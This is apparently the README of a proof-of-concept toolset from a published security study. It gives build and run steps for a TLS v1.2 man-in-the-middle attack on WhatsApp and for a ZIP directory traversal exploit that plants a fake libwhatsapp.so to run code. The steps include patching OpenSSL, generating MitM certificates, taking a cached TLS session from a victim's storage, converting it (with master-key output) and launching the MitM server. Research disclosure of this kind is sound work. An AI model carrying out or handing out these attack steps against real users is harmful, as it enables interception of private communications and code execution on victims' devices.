# TLS v1.2 MitM and code execution toolset for WhatsApp

This directory contains the tooling required for performing TLS v1.2 MitM against
WhatsApp and exploiting the ZIP directory traversal vulnerability analyzed in
our blog post.


## Preparation

In the following we assume environment variable `$POC` points to the root
directory of this repository.

Download OpenSSL 1.1.1f source code, apply TLS v1.2 MitM patch and compile:

    cd /tmp
    curl -O https://ftp.openssl.org/source/old/1.1.1/openssl-1.1.1f.tar.gz
    tar -zxvf openssl-1.1.1f.tar.gz
    mv openssl-1.1.1f openssl-1.1.1f-tls12
    cd openssl-1.1.1f-tls12
    patch -p1 < $POC/openssl-1.1.1f-patches/tls12-mitm.patch
    ./config -d no-shared
    make -j8

Compile BoringSSL (commit **2e5f38a1d871305ffeb0c932d421b01fd43a4168**):

    cd /tmp
    git clone https://boringssl.googlesource.com/boringssl
    cd boringssl
    git checkout 2e5f38a1d871305ffeb0c932d421b01fd43a4168
    mkdir build
    cd build
    cmake ..
    make -j8

Generate server certificate and keys for MitM:

    cd $POC/secrets
    ./gen_certs.sh

Now, build the ZIP payload. To do that you also need to specify the path to an
Android Aarch64 cross-compiler toolchain, that will be used to build our fake
**libwhatsapp.so**:

    cd $POC/tls12_psk_extract/payload
    export CROSS_COMPILE=/opt/android-ndk/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android28-
    make
    ./create_zip.sh
    cd ..
    mv payload/payload.zip .

Prepare environment variables:

    export OPENSSL_SRC=/tmp/openssl-1.1.1f-tls12
    export BORINGSSL_SRC=/tmp/boringssl
    export SECRETS=$POC/secrets

Your current directory should now be `$POC/tls12_psk_extract`.

As a final step we need to build **openssl_session.c** and **boringssl_session.c**.
To do that, just type:

    make

Prior to that, however, you might need to tweak **Makefile** a bit.


## Usage

Let's assume a serialized session to **crashlogs.whatsapp.net** was successfully
extracted from the victim's external storage. We can simulate this scenario by
pulling the following file directly from the target device:

    adb pull /sdcard/Android/data/com.whatsapp/cache/SSLSessionCache/crashlogs.whatsapp.net.443

Next step involves converting the session from BoringSSL DER format to OpenSSL
DER format, so that it can be used by OpenSSL's `s_server`.

    $ ./convert_session.sh crashlogs.whatsapp.net.443
    Set SSL version 771
    Set session id 769bc576393a14450303738d6c81e23489252ba59191f09705d6bb4c6fc6168f
    Set master key 4f562b2c813b429e35cdd08574184d9a6a83d6b2d1c786521c2e49f9a28e6e996a4cf171225e353f60fb71a10d6ff8e8
    Set cipher ECDHE-ECDSA-AES128-GCM-SHA256, id 50380843
    SSL-Session:
        Protocol  : TLSv1.2
        Cipher    : ECDHE-ECDSA-AES128-GCM-SHA256
        Session-ID: 769BC576393A14450303738D6C81E23489252BA59191F09705D6BB4C6FC6168F
        Session-ID-ctx:
        Master-Key: 4F562B2C813B429E35CDD08574184D9A6A83D6B2D1C786521C2E49F9A28E6E996A4CF171225E353F60FB71A10D6FF8E8
        PSK identity: None
        PSK identity hint: None
        SRP username: None
        Start Time: 1611759604
        Timeout   : 304 (sec)
        Verify return code: 0 (ok)
        Extended master secret: yes
    -----BEGIN SSL SESSION PARAMETERS-----
    MHYCAQECAgMDBALAKwQgdpvFdjk6FEUDA3ONbIHiNIklK6WRkfCXBda7TG/GFo8E
    ME9WKyyBO0KeNc3QhXQYTZpqg9ay0ceGUhwuSfmijm6ZakzxcSJeNT9g+3GhDW/4
    6KEGAgRgEX/0ogQCAgEwpAIEAK0DAgEB
    -----END SSL SESSION PARAMETERS-----

The resulting DER file, **session.der**, can be found in the current directory.

Last but not least, run the following script to start the MitM server:

    ./run_server.sh


## Bonus

**openssl\_http\_pipe.py** can be used for spawning an OpenSSL `s_server`
instance and creating a bidirectional pipe with the latter's standard input and
output. This, in turn, allows one to manually parse incoming HTTP requests and
implement custom HTTP logic in Python, using standard built-in classes like
`BaseHTTPRequestHandler`. In fact, this script was used for setting up the Noise
keys extraction demo, presented in our blog post. People wishing to experiment
with their own MitM infrastructure can modify this script to implement their own
callbacks.

